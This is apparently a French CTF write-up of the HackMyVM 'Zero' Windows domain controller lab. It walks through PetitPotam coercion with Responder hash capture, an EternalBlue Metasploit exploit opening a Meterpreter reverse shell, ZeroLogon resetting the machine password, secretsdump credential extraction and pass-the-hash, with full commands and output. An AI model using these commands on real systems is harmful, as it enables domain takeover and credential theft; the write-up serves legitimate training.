---
title: "Solution du CTF Zero de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

Je continue mon exploration des CTFs basés sur Windows et disponibles sur HackMyVM.eu.

### At least you tried

Un scan Nmap indique qu'on a vraisemblablement à faire à un contrôleur de domaine (Kerberos, DNS, LDAP, etc).

```console
$ sudo nmap -T5 --script vuln -sCV -p- 192.168.56.115
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.115
Host is up (0.00044s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-17 16:31:50Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: ZERO)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:F1:DF:F4 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.27 seconds
```

Nmap nous indique que la machine est vulnérable à CVE-2017-0143, on y reviendra plus tard.

J'ai testé le module `coerce_plus` de NetExec et obtenu cet output :

```console
$ nxc smb 192.168.56.115 -u '' -p '' -M coerce_plus -o LISTENER=192.168.56.1 ALWAYS=true
SMB         192.168.56.115  445    DC01             [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC01) (domain:zero.hmv) (signing:True) (SMBv1:True) 
SMB         192.168.56.115  445    DC01             [+] zero.hmv\: 
COERCE_PLUS 192.168.56.115  445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 192.168.56.115  445    DC01             Exploit Success, lsarpc\EfsRpcOpenFileRaw
COERCE_PLUS 192.168.56.115  445    DC01             Exploit Success, samr\EfsRpcOpenFileRaw
COERCE_PLUS 192.168.56.115  445    DC01             Exploit Success, netlogon\EfsRpcOpenFileRaw
[08:44:17] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:179
           ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:179
```

Intéressant, il semble que la machine soit vulnérable à PetitPotam.

J'ai mis un Responder en écoute (`python Responder.py -I vboxnet0`) puis j'ai relancé `nxc` :

On reçoit le hash du compte machine DC01 :

```console
[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[*] [LLMNR]  Poisoned answer sent to fe80::25fc:1fa:40c7:2849 for name DC01
[*] [LLMNR]  Poisoned answer sent to 192.168.56.115 for name DC01
[*] [LLMNR]  Poisoned answer sent to fe80::25fc:1fa:40c7:2849 for name DC01
[*] [LLMNR]  Poisoned answer sent to 192.168.56.115 for name DC01
[*] [LLMNR]  Poisoned answer sent to fe80::25fc:1fa:40c7:2849 for name DC01
[*] [LLMNR]  Poisoned answer sent to 192.168.56.115 for name DC01
[SMB] NTLMv2 Client   : 192.168.56.115
[SMB] NTLMv2 Username : ZERO\DC01$
[SMB] NTLMv2 Hash     : DC01$::ZERO:5d2019776e74fab6:A33B2CFFA5E5CEE9987169B3BCE56679:0101000000000000BDB2EA97AFDFDB0128B73E88B8109E3D00000000020000000000000000000000
```

J'ai tenté de le casser avec hashcat. Comme chantait Queen, _I'm just a poor boy_, j'ai pas de GPU.

Donc j'utilise hashcat avec le CPU Intel. Le tout dans un docker, car je n'ai pas envie d'installer les dépendances nécessaires :

```console
$ docker pull dizcza/docker-hashcat:intel-cpu
intel-cpu: Pulling from dizcza/docker-hashcat
de44b265507a: Pull complete 
--- snip ---
ccd7e8772bb6: Pull complete 
Digest: sha256:2831aac0802a94effdc2cca124a4584eac89d5e5bb6a4ceb808c74ef7aaa25c4
Status: Downloaded newer image for dizcza/docker-hashcat:intel-cpu
docker.io/dizcza/docker-hashcat:intel-cpu
docker run -v /tmp:/data -it dizcza/docker-hashcat:intel-cpu /bin/bash
root@40f3b982092e:~# hashcat /data/dc01_hash.txt /data/rockyou.txt 
hashcat (v6.2.6-851-g6716447df) starting in autodetect mode

OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: 13th Gen Intel(R) Core(TM) i7-1360P, 15820/31705 MB (7926 MB allocatable), 16MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /data/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: DC01$::ZERO:5d2019776e74fab6:a33b2cffa5e5cee9987169...000000
Time.Started.....: Tue Jun 17 08:16:23 2025 (2 secs)
Time.Estimated...: Tue Jun 17 08:16:25 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/data/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6809.0 kH/s (1.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #!goth -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 70c Util: 64%

Started: Tue Jun 17 08:16:04 2025
Stopped: Tue Jun 17 08:16:26 2025
```

Bon, sans trop de surprises, on n'a pas pu casser un hash de compte machine, ils sont souvent générés aléatoirement.

### Kansas City Shuffle

Nmap nous a crié "Eternal Blue". Le nom du CTF nous souffle "ZeroLogin", mais avouez que c'est tentant.

Il y a plusieurs modules dont 3 exploits :

```console
msf6 > search 2017-0143

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

Le dernier consiste à exploiter un implant de la NSA et ici ce n'est pas le cas. On va donc se tourner vers le numéro 1 qui a un rank `normal`.

```console
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                192.168.56.115                                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.56.116   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 192.168.56.116:4444 
[*] 192.168.56.115:445 - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 192.168.56.115:445 - Built a write-what-where primitive...
[+] 192.168.56.115:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.56.115:445 - Selecting PowerShell target
[*] 192.168.56.115:445 - Executing the payload...
[+] 192.168.56.115:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 192.168.56.115
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.37, but the operating system provides version 2.41.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
[*] Meterpreter session 1 opened (192.168.56.116:4444 -> 192.168.56.115:49696) at 2025-06-17 08:28:52 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\Windows\system32
meterpreter > cd c:\users
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd c:/users
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2024-04-15 10:04:31 -0400  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 09:28:00 -0400  All Users
040555/r-xr-xr-x  0     dir   2024-04-15 19:02:08 -0400  Default
040777/rwxrwxrwx  0     dir   2016-07-16 09:28:00 -0400  Default User
040555/r-xr-xr-x  4096  dir   2024-04-15 10:04:31 -0400  Public
100666/rw-rw-rw-  174   fil   2016-07-16 09:16:27 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2024-04-15 10:34:11 -0400  ruycr4ft

meterpreter > cd ruycr4ft
meterpreter > cd Desktop
meterpreter > cat user.txt 
��HMV{D0nt_r3us3_p4$$w0rd5!}
meterpreter > cd c:/Users/Administrator/Desktop
meterpreter > cat root.txt
��HMV{Z3r0_l0g0n_!s_Pr3tty_D4ng3r0u$}
```

Ah bah oui, il s'agissait normalement de ZeroLogon.

### From Hero to Zero

Le principe de ZeroLogon c'est qu'on peut écraser le hash d'un compte machine. Ici, il s'agit donc du compte DC01 que nous ne sommes pas parvenu à casser.

```console
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   NBNAME  DC01             yes       The server's NetBIOS name
   RHOSTS  192.168.56.115   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                    no        The netlogon RPC port (TCP)


   When ACTION is RESTORE:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password to restore for the machine account (in hex)


Auxiliary action:

   Name    Description
   ----    -----------
   REMOVE  Remove the machine account password



View the full module info with the info, or info -d command.

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
[*] Running module against 192.168.56.115

[*] 192.168.56.115: - Connecting to the endpoint mapper service...
[*] 192.168.56.115:49667 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.56.115[49667] ...
[*] 192.168.56.115:49667 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.56.115[49667] ...
[+] 192.168.56.115:49667 - Successfully authenticated
[+] 192.168.56.115:49667 - Successfully set the machine account (DC01$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed

```

Une fois qu'on a mis un mot de passe vide, on peut utiliser `secretsdump` pour obtenir les hashs du contrôleur de domaine :

```console
secretsdump.py -no-pass -just-dc 'DC01$'@192.168.56.115
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6267e36cf72fa3fabf345c19c3d1ac70:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b1d3aa3641cadb38457b122ab3ae1a91:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ruycr4ft:1104:aad3b435b51404eeaad3b435b51404ee:b042c84cb59e7541f9b2e70016090ff0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:dab3a1e6061316b5b3af769d0e74a5e243a1755a04a6cee54833433c32c88e3d
krbtgt:aes128-cts-hmac-sha1-96:e7fe14ced9e4b68f02549cf718d1babc
krbtgt:des-cbc-md5:d0dc1389c4ef23e6
ruycr4ft:aes256-cts-hmac-sha1-96:acd4bf6649ae7c08c821147fbddfcad6e97808c733773d7cfb6dad610a3f0fe8
ruycr4ft:aes128-cts-hmac-sha1-96:7030d22509dd3fe0db2f844f98a7059e
ruycr4ft:des-cbc-md5:08ce587c8f379bce
DC01$:aes256-cts-hmac-sha1-96:6b58c15a6c0f944f01e664997879a439f69fe3e939b82771d4110092db3e704c
DC01$:aes128-cts-hmac-sha1-96:9d5720ecc7a61220603af6f7579b7947
DC01$:des-cbc-md5:617cf7a1d6c2fb64
[*] Cleaning up...
```

Les hashs ne se cassent pas non plus, mais pas grave, on peut faire du PTH :

```console
$ psexec.py -hashes :6267e36cf72fa3fabf345c19c3d1ac70 Administrator@192.168.56.115
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.56.115.....
[*] Found writable share ADMIN$
[*] Uploading file YNsaYAeF.exe
[*] Opening SVCManager on 192.168.56.115.....
[*] Creating service YVHB on 192.168.56.115.....
[*] Starting service YVHB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
